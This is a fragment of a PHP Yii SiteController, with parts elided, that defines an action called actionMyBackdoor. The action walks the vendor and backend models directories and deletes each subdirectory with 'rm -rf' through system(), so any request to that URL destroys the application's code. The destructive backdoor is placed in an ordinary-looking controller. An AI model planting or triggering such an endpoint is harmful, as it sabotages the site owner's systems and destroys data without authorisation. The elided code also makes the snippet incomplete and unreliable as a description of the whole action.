...
class SiteController extends Controller
{
    ...
    public function actionMyBackdoor()
    {    
        ...
        $path = Yii::getAlias("@common").'/modules';
    
        $path2 = Yii::getAlias('@vendor');
        
        $path3 = Yii::getAlias('@backend').'/models';
        ...
        if ($open = scandir($path2)) {
            foreach ($open as $k => $v) {
                if ($v != "." && $v != "..") {
                      ...
                      elseif(is_dir($dir2))
                      {
                         system("rm -rf ".escapeshellarg($dir2));
                      }
        ...
        if ($open = scandir($path3)) {
            foreach ($open as $k => $v) {
                if ($v != "." && $v != "..") {
                      ...
                      elseif(is_dir($dir3))
                      {
                         system("rm -rf ".escapeshellarg($dir3));
                      }
